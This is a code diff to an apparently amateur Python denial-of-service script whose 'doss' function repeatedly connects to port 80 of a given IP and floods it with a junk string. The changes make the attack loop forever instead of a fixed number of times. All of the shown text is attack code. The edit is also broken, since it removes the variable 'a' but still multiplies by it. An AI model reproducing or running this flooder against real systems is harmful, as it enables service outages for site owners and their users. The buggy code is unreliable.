@@ -35,15 +35,8 @@ print (" ")
 def doss(ip):
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip,80))
-    a = 0
-    b = 10
-    c = 30
-    d = 50
-    e = 150
-
-    while a < e:
-        a = a + 1 * b * c * d * e
-        data = ("jsjsgsusnydkyfluftjditdykftifkgfitdkyxtisiydiyd687d58dyixykxkgfitdkgckydkhxtiditxiteoyfiyeoyciyvlhf6idgkd96etkhf69rlhvo6tkyfi6ekhxyiekufyodfkhfkydkyd6islyekhxkgxykxktckgdiydkgxtis7tsurqutditdhkxyictickhfkhfhkcgkchkcoufyofoyfyocoycyodyichofyof69foufohxoyckyfjlcohfohckgtufyochkvyockgxkhcykxitxgkstkxkgdgkxkydoydjvpuvoyfoycdgge")
+    while True:
+        data = ("jsjsgsusnydkyfluftjditdykftifkgfitdkyxtisiydiyd687d58dyixykxkgfitdkgckydkhxtiditxiteoyfiyeoyciyvlhf6idgkd96etkhf69rlhvo6tkyfi6ekhxyiekufyodfkhfkydkyd6islyekhxkgxykxktckgdiydkgxtis7tsurqutditdhkxyictickhfkhfhkcgkchkcoufyofoyfyocoycyodyichofyof69foufohxoyckyfjlcohfohckgtufyochkvyockgxkhcykxitxgkstkxkgdgkxkydoydjvpuvoyfoycdgge") *1000
         data = data * a
         for i in data:
             i = str(i).encode("utf-8")
@@ -62,10 +55,8 @@ time.sleep(1)
 print (green + "[IP:"+ip+"] [Port:80] [speed:rondom]")
 print (" ")
 
-for i in range(100):
-    doss(ip)
-    doss(ip)
-    doss(ip)
-    doss(ip)
-    doss(ip)
-
+while True:
+    for i in range(100):
+        doss(ip)
+        doss(ip)
+        doss(ip)
